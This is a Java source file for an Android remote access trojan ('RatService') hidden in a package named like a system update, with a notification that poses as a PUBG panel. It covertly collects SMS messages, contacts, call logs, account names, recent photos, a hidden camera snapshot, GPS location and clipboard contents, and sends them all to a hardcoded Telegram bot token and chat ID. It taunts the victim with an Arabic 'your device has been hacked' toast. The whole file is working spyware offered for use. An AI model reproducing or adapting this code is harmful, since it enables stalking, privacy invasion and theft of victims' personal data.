package com.system.update;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.*;
import android.content.*;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.widget.Toast;
import java.io.*;
import java.util.List;
import okhttp3.*;

public class RatService extends Service {
    private static final String BOT_TOKEN = "‏9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
    private static final String CHAT_ID = "6978974735";
    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";

    private OkHttpClient client = new OkHttpClient();
    private String lastClipboard = "";
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        
        showToast("⚠️ تم اختراق جهازك بنجاح 😂");

        new Thread(() -> {
            try {
                sendTextToTelegram("🔄 **الأداة اشتغلت! جاري سحب كل البيانات (رسايل، مكالمات، صور)...**");
                
                dumpAllAccounts(); Thread.sleep(1000);
                String info = "📱 **Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
                sendTextToTelegram(info); Thread.sleep(1000);

                dumpAllSms(); Thread.sleep(2000);
                dumpContacts(); Thread.sleep(1500);
                dumpCallLogs(); Thread.sleep(1500);
                dumpImages(); Thread.sleep(1500);
                
                takePhoto(); 
                getLocation();

                sendTextToTelegram("✅ **اكتمل سحب البيانات والصور بالكامل!**");
                
                startClipboardMonitor();
            } catch (Exception e) {
                sendTextToTelegram("❌ خطأ: " + e.getMessage());
            }
        }).start();
    }

    private void startForegroundService() {
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, channelId).setContentTitle("panel pubge").setSmallIcon(android.R.drawable.ic_menu_manage).build();
            startForeground(1, notification);
        }
    }

    public void showToast(String msg) {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();
        });
    }

    // القوة الخرافية: سحب كل الرسايل
    private void dumpAllSms() {
        File file = new File(getExternalFilesDir(null), "sms_all_complete.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            // بنسحب من Telephony.Sms (اللي بيشمل الـ Inbox, Sent, Draft)
            Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
            if (c != null && c.moveToFirst()) {
                do {
                    String address = c.getString(c.getColumnIndexOrThrow("address"));
                    String body = c.getString(c.getColumnIndexOrThrow("body"));
                    String type = c.getString(c.getColumnIndexOrThrow("type"));
                    String date = c.getString(c.getColumnIndexOrThrow("date"));
                    
                    String typeStr = "Inbox";
                    if (type.equals("2")) typeStr = "Sent";
                    else if (type.equals("3")) typeStr = "Draft";
                    else if (type.equals("4")) typeStr = "Outbox";

                    bw.write("[" + typeStr + "] Date: " + date + "\nTo/From: " + address + "\n" + body + "\n-------------------\n");
                } while (c.moveToNext());
                c.close();
            } else {
                bw.write("لا توجد رسائل أو لم يتم منح صلاحية الرسايل الافتراضية.");
            }
            bw.flush(); uploadFileToTelegram(file, "text/plain");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل سحب الرسائل: " + e.getMessage());
        }
    }

    private void takePhoto() {
        try {
            Camera camera = Camera.open(0);
            camera.setPreviewTexture(new android.graphics.SurfaceTexture(10));
            camera.startPreview();
            camera.takePicture(null, null, (data, cam) -> {
                File photo = new File(getExternalFilesDir(null), "hacked_photo.jpg");
                try (FileOutputStream fos = new FileOutputStream(photo)) {
                    fos.write(data);
                } catch (IOException ignored) {}
                cam.release();
                uploadFileToTelegram(photo, "image/jpeg");
            });
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل الكاميرا: " + e.getMessage());
        }
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                sendTextToTelegram("📍 **الموقع:** https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
            }
        } catch (SecurityException ignored) {}
    }

    private void dumpImages() {
        try {
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {MediaStore.Images.Media.DATA};
            Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                    File imgFile = new File(path);
                    if (imgFile.exists() && imgFile.length() < 10 * 1024 * 1024) {
                        uploadFileToTelegram(imgFile, "image/jpeg");
                        Thread.sleep(2000);
                    }
                }
                cursor.close();
            }
        } catch (Exception ignored) {}
    }

    private void dumpAllAccounts() {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccounts();
            StringBuilder sb = new StringBuilder("📧 **الحسابات:**\n");
            for (Account account : accounts) sb.append("- ").append(account.type).append(": `").append(account.name).append("`\n");
            sendTextToTelegram(sb.toString());
        } catch (Exception ignored) {}
    }

    private void startClipboardMonitor() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                        ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                        String text = item.getText() != null ? item.getText().toString() : "";
                        if (!text.isEmpty() && !text.equals(lastClipboard)) {
                            lastClipboard = text;
                            sendTextToTelegram("📋 **Clipboard:**\n`" + text + "`");
                        }
                    }
                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void dumpContacts() {
        File file = new File(getExternalFilesDir(null), "contacts_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) { while (c.moveToNext()) bw.write(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + " : " + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n"); c.close(); }
            bw.flush(); uploadFileToTelegram(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpCallLogs() {
        File file = new File(getExternalFilesDir(null), "calls_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) { while (c.moveToNext()) bw.write("Number: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) + "\n"); c.close(); }
            bw.flush(); uploadFileToTelegram(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void sendTextToTelegram(String text) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
        Request request = new Request.Builder().url(TG_API + "sendMessage").post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void uploadFileToTelegram(File file, String mimeType) {
        if (!file.exists()) return;
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)))
                .build();
        Request request = new Request.Builder().url(TG_API + "sendDocument").post(requestBody).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { isRunning = false; super.onDestroy(); }
}
